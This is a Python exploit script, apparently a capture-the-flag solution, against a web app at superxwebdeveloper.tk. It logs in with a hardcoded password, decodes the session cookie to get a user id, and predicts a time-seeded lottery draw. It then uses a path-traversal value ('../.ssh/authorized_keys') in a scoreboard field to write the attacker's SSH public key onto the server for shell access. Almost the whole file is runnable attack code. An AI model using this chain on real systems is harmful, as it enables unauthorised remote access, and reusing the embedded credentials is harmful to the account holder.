import sys, os
import requests
import time
import numpy as np
import random
import base64
import json

def gen_win(id):
    time_to_send = int(time.time()) + 2
    random.seed(time_to_send + id)
    solution = random.sample(list(range(1,50)), 5)
    solution.sort()


    guess = str(solution)
    guess = guess[1:-1]

    return time_to_send, guess



def main():
    
    site = "https://superxwebdeveloper.tk/login"

    session = requests.Session()

    username = "superXWebDeveloper"
    password = "bA8wd5NkGvtMdaYgBbD3"

    guess = "1,2,3,4,5"

    response = session.post(site, data = {'username' : username, 'password' : password})
    
    #print(session.cookies.get_dict()['session'])
    #print(response.text)

    new_url = "https://superxwebdeveloper.tk/winner"
    

    get_id = session.cookies.get_dict()['session']
    get_id = get_id.split('.')[0]
    get_id = base64.b64decode(get_id)
    get_id = get_id.decode()
    get_id = json.loads(get_id)

    id = get_id['id']

    print("id :", id)

    time_to_send, guess = gen_win(id)

    while int(time.time()) < time_to_send:
        time_to_send, guess = gen_win(id)

        response = session.post(new_url, data = {'guess' : guess, 'id' : id})
        #print(response.text)

        if "not" in response.text:
            print("failed, retrying...")
        else:
            break

    last_url = "https://superxwebdeveloper.tk/scoreboard"

    tmp_key_file = open( os.path.expanduser('~/.ssh/id_rsa.pub') )

    key_pub = tmp_key_file.read()

    response = session.post(last_url, data = {'name' : key_pub, 'date' : "../.ssh/authorized_keys"})

    print("done, connect via ssh")

main()
